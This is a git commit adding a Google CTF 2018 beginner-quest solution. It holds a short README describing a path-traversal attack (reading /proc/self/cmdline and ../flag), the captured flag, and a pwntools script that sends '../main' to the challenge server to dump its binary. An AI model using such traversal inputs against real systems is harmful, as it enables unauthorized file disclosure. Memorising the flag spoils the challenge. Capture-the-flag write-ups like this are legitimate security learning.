2c3eb3a18c07e37b6de4e5a710531749e55dc80e
KwonL <dlrnjsgud322@gmail.com>
2018-09-19 01:31:14 +0900

    Solve Admin_UI

---
+++ 2018/google_CTF/beginners_quests/Admin_UI/README.md
@@ -0,0 +1,11 @@
+# Admin UI
+
+Simply travel over file path
+../../../../../......./proc/self/cmdline notify that this program's name is ./main
+so we can dump main
+
+And ./main read some flag from file name 'flag'
+
+so, just print out by entering ../flag
+
+CTF{I_luv_buggy_sOFtware}
---
+++ 2018/google_CTF/beginners_quests/Admin_UI/get_main.py
@@ -0,0 +1,22 @@
+from pwn import * 
+import sys
+
+def main() :
+    HOST = "mngmnt-iface.ctfcompetition.com"
+    PORT = "1337"
+    conn = remote(HOST, PORT)
+
+    conn.readuntil("3) Quit")
+
+    conn.sendline("2")
+    conn.sendline("../main")
+
+    main_binary = conn.readuntil("1) ")
+    print(sys.getsizeof(main_binary))
+
+    with open("./main", "wb") as f :
+        f.write(main_binary)
+
+    return 0
+
+main()
